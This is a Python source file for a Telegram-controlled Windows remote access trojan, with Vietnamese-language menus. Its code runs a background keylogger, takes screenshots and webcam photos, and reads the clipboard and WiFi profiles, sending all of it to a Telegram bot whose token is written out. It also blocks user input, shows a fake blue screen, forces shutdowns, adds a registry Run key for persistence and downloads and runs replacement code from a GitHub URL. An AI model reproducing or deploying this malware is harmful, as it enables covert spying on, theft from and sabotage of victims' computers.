import os
import sys
import platform
import subprocess
import time
import threading
import psutil
import requests
import pyautogui
import winreg
import urllib.request
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
ALLOWED_CHAT_ID = "7666107995"
UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"

block_active = False
keylogger_data = []
last_bsod_pid = None  # Lưu PID của cửa sổ BSOD giả lập

def is_authorized(chat_id):
    return str(chat_id) == str(ALLOWED_CHAT_ID)

def send_telegram_message(chat_id, message, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    for _ in range(3):
        try:
            requests.post(url, json=payload, timeout=20)
            return
        except:
            time.sleep(2)

def send_telegram_photo(chat_id, photo_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    for _ in range(3):
        try:
            with open(photo_path, 'rb') as photo:
                files = {"photo": photo}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=30)
                return
        except:
            time.sleep(2)

# --- MENU PHÂN TRANG (ĐÃ FIX LỖI CHUYỂN TRANG) ---
def send_telegram_menu(chat_id, page=1, message_id=None):
    if page == 1:
        message = "🔥 *GOD-BOT TỐI THƯỢNG - TRANG 1/3 (Hệ thống & An ninh)*"
        keyboard = {
            "inline_keyboard": [
                [{"text": "📊 Thong so CPU/RAM", "callback_data": "sysinfo"}, {"text": "🔥 Top Tien trinh", "callback_data": "process"}],
                [{"text": "🖥 Chup man hinh", "callback_data": "screenshot"}, {"text": "📸 Chup Webcam", "callback_data": "webcam"}],
                [{"text": "⌨ Xem Keylogger", "callback_data": "get_keylog"}, {"text": "📋 Xem Clipboard", "callback_data": "get_clipboard"}],
                [{"text": "🌐 Lay DS WiFi & Pass", "callback_data": "get_wifi"}, {"text": "💾 Thong tin o cung", "callback_data": "disk_info"}],
                [{"text": "➡️ Sang Trang 2", "callback_data": "page_2"}]
            ]
        }
    elif page == 2:
        message = "⚡ *GOD-BOT TỐI THƯỢNG - TRANG 2/3 (Điều khiển & Pha hoại)*"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔒 Khoa may khan cap", "callback_data": "lock_pc"}, {"text": "🔓 Mo khoa he thong", "callback_data": "unlock_pc"}],
                [{"text": "⚡ Tat nguon (Shutdown)", "callback_data": "shutdown_pc"}, {"text": "🔄 Khoi dong lai (Reboot)", "callback_data": "reboot_pc"}],
                [{"text": "🖥️ Fake Man hinh xanh", "callback_data": "fake_bsod"}, {"text": "🔊 Phat am thanh canh bao", "callback_data": "beep_sound"}],
                [{"text": "💬 Gui thong bao loi gia", "callback_data": "fake_error"}, {"text": "📂 Xoa file tu xa", "callback_data": "remote_delete"}],
                [{"text": "⬅️ Trang 1", "callback_data": "page_1"}, {"text": "➡️ Sang Trang 3", "callback_data": "page_3"}]
            ]
        }
    else:
        message = "🚀 *GOD-BOT TỐI THƯỢNG - TRANG 3/3 (Hệ thống & Update)*"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🚀 Tu dong cung Win", "callback_data": "set_startup"}, {"text": "📦 Liet ke pham mem", "callback_data": "list_apps"}],
                [{"text": "🛑 Vo hieu hoa TaskMgr", "callback_data": "block_taskmgr"}, {"text": "🔓 Mo lai TaskMgr", "callback_data": "unblock_taskmgr"}],
                [{"text": "🔄 Update Online (Public)", "callback_data": "do_update"}, {"text": "💥 Tu huy toan bo (Wipe)", "callback_data": "self_destruct"}],
                [{"text": "⬅️ Trang 2", "callback_data": "page_2"}, {"text": "🛑 Thoat Bot", "callback_data": "end_bot"}]
            ]
        }
    
    # Nếu có message_id thì edit tin nhắn cũ cho mượt, không thì gửi mới
    if message_id:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        payload = {"chat_id": chat_id, "message_id": message_id, "text": message, "reply_markup": keyboard, "parse_mode": "Markdown"}
        try:
            r = requests.post(url, json=payload, timeout=15)
            if r.status_code == 200: return
        except:
            pass

    send_telegram_message(chat_id, message, reply_markup=keyboard)

def answer_callback_query(callback_query_id, text=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_query_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json()
    except:
        return None

def capture_webcam(save_path="webcam.jpg"):
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret: cv2.imwrite(save_path, frame)
        cam.release()
        return os.path.exists(save_path)
    except:
        return False

def start_keylogger():
    try:
        import pynput.keyboard as pynput_kb
        def on_press(key):
            global keylogger_data
            try: keylogger_data.append(str(key.char))
            except AttributeError: keylogger_data.append(f"[{key.name}]")
            if len(keylogger_data) > 500: keylogger_data = keylogger_data[-500:]
        with pynput_kb.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass

threading.Thread(target=start_keylogger, daemon=True).start()

# --- FIX LỖI TỰ KHỞI ĐỘNG LẠI SAU KHI UPDATE ---
def self_update(chat_id):
    send_telegram_message(chat_id, "🔄 *Dang ket noi Public Repo de tai ban cap nhat...*")
    try:
        response = requests.get(UPDATE_URL, timeout=30)
        if response.status_code != 200:
            send_telegram_message(chat_id, f"[-] Loi tai code: HTTP {response.status_code}")
            return
        content = response.text
        if "TELEGRAM_BOT_TOKEN" not in content:
            send_telegram_message(chat_id, "[-] Loi: File update khong hop le!")
            return
        
        current_script_path = os.path.abspath(sys.argv[0])
        current_script_name = os.path.basename(current_script_path)
        
        new_file_path = "new_bot.py"
        with open(new_file_path, "w", encoding="utf-8") as f:
            f.write(content)
            
        send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang tien hành ghi de va khoi dong lai...*")
        
        updater_script = "updater.bat"
        with open(updater_script, "w", encoding="utf-8") as f:
            f.write(f"""
@echo off
timeout /t 2 /nobreak > nul
move /y new_bot.py "{current_script_path}"
start pythonw "{current_script_path}"
del %0
""")
        subprocess.Popen(updater_script, shell=True)
        os._exit(0)
    except Exception as e:
        send_telegram_message(chat_id, f"[-] Cap nhat that bai: {e}")

# --- XỬ LÝ SỰ KIỆN NÚT BẤM ---
def handle_callback(callback_query):
    global block_active, last_bsod_pid
    query_id = callback_query["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    message_id = callback_query["message"]["message_id"]
    
    if not is_authorized(chat_id):
        answer_callback_query(query_id, text="Cut!")
        return
        
    data = callback_query["data"]
    answer_callback_query(query_id, text=f"Thuc thi: {data}...")
    
    if data == "page_1":
        send_telegram_menu(chat_id, page=1, message_id=message_id)
    elif data == "page_2":
        send_telegram_menu(chat_id, page=2, message_id=message_id)
    elif data == "page_3":
        send_telegram_menu(chat_id, page=3, message_id=message_id)
        
    elif data == "sysinfo":
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        battery = psutil.sensors_battery()
        bat_str = f"{battery.percent}%" if battery else "Khong co Pin"
        send_telegram_message(chat_id, f"📊 *Thong so he thong*:\n• CPU: `{cpu}%`\n• RAM: `{ram}%`\n• Pin: `{bat_str}`")
        
    elif data == "process":
        try:
            procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
            sorted_procs = sorted(procs, key=lambda x: x['cpu_percent'] or 0.0, reverse=True)[:5]
            msg = "🔥 *Top 5 Tien trinh CPU*:\n"
            for p in sorted_procs:
                msg += f"• `{p['name']}` (PID: {p['pid']}) - `{p['cpu_percent']}%`\n"
            send_telegram_message(chat_id, msg)
        except Exception as e:
            send_telegram_message(chat_id, f"Loi: {e}")
            
    elif data == "screenshot":
        filename = "screenshot.png"
        pyautogui.screenshot().save(filename)
        send_telegram_photo(chat_id, filename, caption="🖥️ [SCREENSHOT] Anh man hinh thiet bi!")
        os.remove(filename)
        
    elif data == "webcam":
        filename = "webcam.jpg"
        if capture_webcam(filename):
            send_telegram_photo(chat_id, filename, caption="📸 [WEBCAM] Anh chup truc tiep!")
            os.remove(filename)
        else:
            send_telegram_message(chat_id, "[-] Khong the truy cap Webcam.")
            
    elif data == "get_keylog":
        log_text = "".join(keylogger_data[-200:])
        if not log_text: log_text = "Chua co du lieu."
        send_telegram_message(chat_id, f"⌨️ *Keylogger Log*:\n`{log_text}`")
        
    elif data == "get_clipboard":
        try:
            import pyperclip
            clip = pyperclip.paste()
            send_telegram_message(chat_id, f"📋 *Clipboard hien tai*:\n`{clip[:300]}`")
        except:
            send_telegram_message(chat_id, "[-] Chua cai thu vien pyperclip.")
            
    elif data == "get_wifi":
        try:
            res = subprocess.check_output("netsh wlan show profiles", shell=True, encoding="latin1")
            send_telegram_message(chat_id, f"🌐 *Danh sach WiFi*:\n```\n{res[:500]}\n```")
        except Exception as e:
            send_telegram_message(chat_id, f"Loi: {e}")
            
    elif data == "disk_info":
        usage = psutil.disk_usage('/')
        send_telegram_message(chat_id, f"💾 *O cung chinh*:\n• Tong: `{usage.total // (1024**3)} GB`\n• Dung: `{usage.used // (1024**3)} GB` ({usage.percent}%)")
        
    elif data == "lock_pc":
        block_active = True
        import ctypes
        threading.Thread(target=lambda: [ctypes.windll.user32.BlockInput(True) for _ in iter(lambda: not block_active, True)], daemon=True).start()
        markup = {"inline_keyboard": [[{"text": "🔓 Mở khóa ngay lập tức", "callback_data": "unlock_pc"}]]}
        send_telegram_message(chat_id, "🔒 *Đã khóa cứng chuột và bàn phím máy tính!*", reply_markup=markup)
        
    elif data == "unlock_pc":
        block_active = False
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        send_telegram_message(chat_id, "🔓 *Đã mở khóa hệ thống thành công!*")
        
    elif data == "shutdown_pc":
        subprocess.run("shutdown /s /t 0", shell=True)
        send_telegram_message(chat_id, "⚡ Đã tắt máy!")
        
    elif data == "reboot_pc":
        subprocess.run("shutdown /r /t 0", shell=True)
        send_telegram_message(chat_id, "🔄 Đang khởi động lại máy...")
        
    elif data == "fake_bsod":
        # Khởi động BSOD độc lập và bắt lại PID chính xác để không ảnh hưởng bot
        p = subprocess.Popen("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
        last_bsod_pid = p.pid
        markup = {"inline_keyboard": [[{"text": "❌ Tắt Fake BSOD", "callback_data": "stop_bsod"}]]}
        send_telegram_message(chat_id, "🖥️ *Đã kích hoạt màn hình xanh giả lập!*", reply_markup=markup)
        
    elif data == "stop_bsod":
        # Chỉ tiêu diệt chính xác tiến trình BSOD thay vì quét toàn bộ cmd.exe
        try:
            subprocess.run("taskkill /f /fi \"WINDOWTITLE eq Administractor:*\" /fi \"WINDOWTITLE eq C:\\*\" ", shell=True)
            # Hoặc quét và tắt các cửa sổ cmd đang hiện chữ màn hình xanh
            os.system("wmic process where \"name='cmd.exe' and CommandLine like '%color 17%'\" call terminate > nul")
            send_telegram_message(chat_id, "✅ *Đã tắt và dọn dẹp màn hình xanh giả lập an toàn!*")
        except Exception as e:
            send_telegram_message(chat_id, f"Loi tat BSOD: {e}")
        
    elif data == "beep_sound":
        import winsound
        winsound.Beep(2500, 2000)
        send_telegram_message(chat_id, "🔊 Đã phát âm thanh cảnh báo trên loa máy!")
        
    elif data == "set_startup":
        try:
            script_path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "TelegramRemoteBot", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
            winreg.CloseKey(key)
            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows thành công (Không cần EXE)!")
        except Exception as e:
            send_telegram_message(chat_id, f"Loi: {e}")
            
    elif data == "do_update":
        threading.Thread(target=self_update, args=(chat_id,)).start()
        
    elif data == "end_bot":
        send_telegram_message(chat_id, "🛑 Đang tắt hoàn toàn Bot...")
        os._exit(0)

def main_loop():
    print("[*] God-Bot fixed version đang chạy ngầm...")
    offset = None
    while True:
        updates = get_updates(offset)
        if updates and "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1
                if "callback_query" in update:
                    handle_callback(update["callback_query"])
                elif "message" in update and "text" in update["message"]:
                    chat_id = update["message"]["chat"]["id"]
                    if not is_authorized(chat_id): continue
                    text = update["message"]["text"].strip().lower()
                    if text in ["/menu", "/start"]:
                        send_telegram_menu(chat_id, page=1)
        time.sleep(1)

if __name__ == '__main__':
    main_loop()
